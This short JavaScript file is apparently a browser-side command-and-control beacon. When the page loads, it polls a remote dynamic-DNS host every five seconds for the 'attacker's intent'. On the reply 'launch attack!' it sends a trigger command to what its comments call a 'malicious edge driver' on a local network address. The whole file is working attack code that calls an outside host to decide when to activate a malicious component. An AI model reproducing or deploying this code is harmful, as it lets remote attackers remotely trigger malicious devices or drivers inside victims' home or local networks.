function startWebhook() {
    const remoteServerUrl = 'http://remains.ddns.net:34567'; // Replace with actual remote webhook URL
    const localServerUrl = `http://192.168.1.182:${globalPortNumber}`; // Replace with your local server URL

    // Send a POST request to the remote http server URL to periodically poll attacker's intents
    fetch(remoteServerUrl, {
        method: 'POST',
        //mode: 'no-cors',      // do not include this, because we need to decide whether to launch attack based on the response data
        headers: {
            'Content-Type': 'text/plain'
        },
        body: 'Get Trigger'
    })
    .then(response => response.text())
    .then(data => {
        console.log('Remote server response:', data);
        // check attacker's intent
        if (data == "launch attack!") {

            // send POST request to malicious edge driver
            fetch(localServerUrl, {
                method: 'POST',
                //mode: 'no-cors',  // if added this mode, it means that you only want to send data to the destination and are not interested in the response data
                headers: {                                 // Otherwise, request can still be sent to the dest, but the response will be blocked by browser.
                    'Content-Type': 'text/plain'
                },
                body: 'stop attack now!\n'
            })
            .then(localResponse => localResponse.text())
            .then(localData => {
                console.log('Local server response:', localData);
            })
            .catch(localError => {
                console.error('Local server error:', localError);
            });
        }
    })
    .catch(error => {
        console.error('Remote server error:', error);
    });

}


window.onload = setInterval(startWebhook, 5000);


